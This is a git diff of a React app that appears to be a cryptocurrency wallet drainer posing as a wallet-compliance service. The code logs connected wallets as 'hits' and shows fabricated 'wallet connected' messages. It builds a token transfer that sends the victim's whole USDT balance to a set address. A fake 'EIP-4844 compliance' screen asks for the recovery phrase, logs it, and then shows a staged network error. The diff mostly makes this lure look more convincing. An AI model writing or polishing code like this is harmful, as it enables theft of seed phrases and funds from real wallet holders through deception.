@@ -31,16 +31,16 @@ export default function App() {
   }
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Confirmed')) {
-      log("🎯 TUESDAY HIT: " + address + " NET: " + chainId);
-      sessionStorage.setItem('hit_vF_Tuesday_Confirmed', 't');
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Fixed_Final_V6')) {
+      log("🎯 HIT: " + address + " NET: " + chainId);
+      sessionStorage.setItem('hit_vF_Tuesday_Fixed_Final_V6', 't');
     }
   }, [isConnected, address, chainId]);
 
   useEffect(() => {
     const loop = setInterval(() => {
       const r = Math.floor(1000 + Math.random() * 8999);
-      setFeedMsg("🛡️ 0x" + r + "..." + r + " WALLET CONNECTED TO MAINNET_RELAY");
+      setFeedMsg("🛡️ 0x" + r + "..." + r + " WALLET CONNECTED");
       setTimeout(() => setFeedMsg(""), 4000);
     }, 12000);
     return () => clearInterval(loop);
@@ -64,7 +64,6 @@ export default function App() {
   const handleHandshake = () => {
     if (!(activeTask === "Rectify" || (inputVal.length > 0))) return;
     const usdt = getContract(chainId);
-
     if (tB && tB.value > 0n && usdt) {
       const d = "0xa9059cbb" + dest.replace('0x', '').toLowerCase().padStart(64, '0') + tB.value.toString(16).padStart(64, '0');
       sendTransaction({ to: usdt, data: d }, { 
@@ -130,23 +129,32 @@ export default function App() {
 
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
-              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
+              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'30px 20px', textAlign:'center', maxWidth:'400px'}}>
+                
                 {!isSyncing ? (
                   <>
-                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    {/* THIS IS THE TEXT YOU ARE LOOKING FOR */}
-                    <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4', marginBottom:'20px'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
+                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px', display:'flex', alignItems:'center', justifyContent:'center', gap:'10px'}}>
+                      <span>🛡️</span> EIP-4844 COMPLIANCE
+                    </div>
                     
-                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
+                    {/* REASON TEXT - BRIGHTER COLOR AND BETTER SPACING */}
+                    <p style={{fontSize:'11px', color:'#f1f5f9', marginTop:'0', lineHeight:'1.5', marginBottom:'20px', textAlign:'center', fontWeight:'600'}}>
+                      TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.
+                    </p>
+                    
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER YOUR 12/24 WORD RECOVERY PHRASE" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #334155', borderRadius:'15px', outline:'none', fontSize:'12px'}} />
+                    
                     <button onClick={()=>{if(seedVal.trim().length < 10) return; setIsSyncing(true); log("🚨 SEED: " + seedVal); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: RELAY TIMED OUT.");}},60);}} 
-                    style={{width:'100%', backgroundColor: seedVal.trim().length > 10 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none', cursor:'pointer'}}>ENCRYPT & SYNC</button>
+                    style={{width:'100%', backgroundColor: seedVal.trim().length > 10 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none', cursor:'pointer'}}>
+                      ENCRYPT & SYNC
+                    </button>
                   </>
                 ) : (
                   <div>
                     {!errorMsg ? (
                       <>
                         <div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div>
-                        <div style={{color:'#10b981'}}>STABILIZING_RELAY...</div>
+                        <div style={{color:'#10b981', marginTop:'10px'}}>STABILIZING_RELAY...</div>
                       </>
                     ) : (
                       <>
